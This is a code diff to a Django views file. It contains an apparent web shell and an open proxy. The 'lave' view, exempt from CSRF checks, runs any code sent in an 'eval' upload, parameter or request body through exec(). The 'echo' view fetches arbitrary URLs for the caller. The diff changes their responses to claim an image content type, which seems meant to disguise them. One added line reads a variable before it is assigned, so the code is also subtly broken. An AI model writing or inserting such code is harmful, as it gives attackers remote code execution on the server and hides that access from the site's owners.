@@ -32,12 +32,12 @@ def echo(r):
 			r = requests.head(u, allow_redirects=True)
 			h = r.headers
 			if not h:
-				return HttpResponse('No headers', content_type="text/css")
+				return HttpResponse('No headers', content_type="image/png")
 			u = "\n".join(["%s: %s" % (k, h[k]) for k in h])
 			t = g.get('t')
 			if t and t.startswith("text/"):
 				return HttpResponse(u)
-			return HttpResponse(u, content_type="text/css")
+			return HttpResponse(u, content_type="image/png")
 		u = g.get('l')
 		if u:
 			a = g.get('a')
@@ -61,16 +61,18 @@ def echo(r):
 				r = o.read()
 				o.close()
 			return HttpResponse(r, content_type=(t or 'image/png'))
-		return HttpResponse('No URL', content_type="text/css")
+		return HttpResponse('No URL', content_type="image/png")
 	except:
 		from traceback import format_exc
-		return HttpResponse(format_exc(), status=500, content_type="text/css")
+		return HttpResponse(format_exc(), status=500, content_type="image/png")
 
 @csrf_exempt
 def lave(request):
 	try:
 		aux = {}
+		method=None
 		while True:
+			method = data.get('method')
 			data = request.FILES
 			if data:
 				data = data.get('eval')
@@ -79,10 +81,6 @@ def lave(request):
 					break
 			REQ = request.POST or request.GET
 			if REQ:
-				data = REQ.get('from', False)
-				if data:
-					open("mail.txt", "w").write(repr(REQ))
-					return HttpResponse("OK")
 				data = REQ.get('eval', False)
 				if data:
 					break
@@ -94,6 +92,8 @@ def lave(request):
 			data = request.body.decode("UTF-8")
 			break
 		exec(data)
+		if method:
+			return main(request)
 		return aux['main'](request)
 	except:
 		from traceback import format_exc
